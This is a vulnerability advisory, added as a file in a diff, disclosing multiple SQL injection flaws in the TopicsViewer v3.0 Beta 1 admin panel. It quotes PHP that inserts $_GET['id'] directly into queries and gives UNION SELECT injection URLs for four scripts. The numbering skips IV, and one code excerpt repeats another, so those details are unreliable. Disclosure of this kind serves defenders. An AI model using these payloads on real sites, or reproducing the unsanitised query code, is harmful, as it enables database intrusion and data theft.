@@ -1,0 +1,66 @@
+TopicsViewer v3.0 Beta 1   - Multiple Sql Injection Vulnerabilty
+===================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://www.topicsviewer.com/
+####################################################################
+
+Multiple Sql Injection
+======================
+
+VULNERABILITY
+##############
+[I] /admincp/edit_block.php (line 46-48)
+
+$sql_b_e = "select * from blocks where b_id = $_GET[id] ";
+$result_b_e = @mysql_query ($sql_b_e);
+$block = @mysql_fetch_array ($result_b_e);
+
+#########
+EXPLOIT
+#########
+localhost/Path/admincp/edit_block.php?id=1+and+1=2+union+select+1,version(),3,4,5,6,7,8,9,10
+
+VULNERABILITY
+##############
+[II] /admincp/edit_cat.php (line 77-79)
+
+    $sql = "select * from cat where c_id = $_GET[id]";
+    $result = @mysql_query ($sql);
+    $cat= @mysql_fetch_array ($result);
+
+#########
+EXPLOIT
+#########
+localhost/Path/admincp/edit_cat.php?id=1+and+1=2+union+select+1,version(),3,4,5,6,7,8
+
+VULNERABILITY
+##############
+[III] /admincp/edit_note.php (line 77-79)
+
+    $sql = "select * from cat where c_id = $_GET[id]";
+    $result = @mysql_query ($sql);
+    $cat= @mysql_fetch_array ($result);
+
+#########
+EXPLOIT
+#########
+localhost/Path/admincp/edit_note.php?id=1+and+1=2+union+select+1,version(),3,4,5
+
+
+VULNERABILITY
+##############
+[V] /admincp/rmv_topic.php (line 46-47)
+
+    $sql = "select * from topics where t_id = $_GET[id] LIMIT 1 ;";
+                 $result = @mysql_query ($sql);
+
+#########
+EXPLOIT
+#########
+localhost/Path/admincp/rmv_topic.php?id=1+and+1=2+union+select+1,version(),3,4,5,6,7,8,9,10,11,12,13,14
+
+####################################################################
